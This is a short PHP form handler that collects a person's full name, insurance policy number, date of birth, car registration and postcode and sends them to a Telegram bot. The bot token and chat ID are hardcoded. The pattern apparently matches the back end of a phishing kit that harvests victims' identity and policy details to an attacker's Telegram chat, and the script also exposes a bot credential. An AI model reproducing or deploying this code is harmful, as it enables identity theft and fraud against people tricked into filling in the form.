<?php
// Ensure only POST requests are allowed
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Ensure all necessary form fields are present
    if (isset($_POST['full_name']) && isset($_POST['policy_number']) && isset($_POST['dob']) && isset($_POST['car_reg_number']) && isset($_POST['postcode']) && isset($_POST['message'])) {
        // Define your Telegram bot token and chat ID
        $botToken = '6803981093:AAFyezv3NSXKm8_GOH5XuqnSfDf_dCLRqsI';
        $chatId = 'axammm';

        // Get the form data
        $fullName = $_POST['full_name'];
        $policyNumber = $_POST['policy_number'];
        $dob = $_POST['dob'];
        $carRegNumber = $_POST['car_reg_number'];
        $postcode = $_POST['postcode'];
        $message = $_POST['message'];

        // Prepare the message to send to Telegram
        $telegramMessage = "New Form Submission\n\n";
        $telegramMessage .= "Full Name: $fullName\n";
        $telegramMessage .= "Policy Number: $policyNumber\n";
        $telegramMessage .= "Date of Birth: $dob\n";
        $telegramMessage .= "Car Registration Number: $carRegNumber\n";
        $telegramMessage .= "Postcode: $postcode\n";
        $telegramMessage .= "Message: $message";

        // Send message to Telegram
        $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
        $telegramData = http_build_query([
            'chat_id' => $chatId,
            'text' => $telegramMessage
        ]);
        $telegramOptions = [
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/x-www-form-urlencoded',
                'content' => $telegramData
            ]
        ];
        $telegramContext = stream_context_create($telegramOptions);
        $telegramResult = file_get_contents($telegramUrl, false, $telegramContext);

        // Check if message was sent successfully
        if ($telegramResult === FALSE) {
            // Handle error
            echo json_encode(array('error' => 'Failed to send message to Telegram.'));
        } else {
            // Respond with a success message
            echo json_encode(array('success' => true));
        }
    } else {
        // Respond with an error message if any required fields are missing
        echo json_encode(array('error' => 'Missing required form fields.'));
    }
} else {
    // Respond with an error message if request method is not POST
    echo json_encode(array('error' => 'Invalid request method'));
}
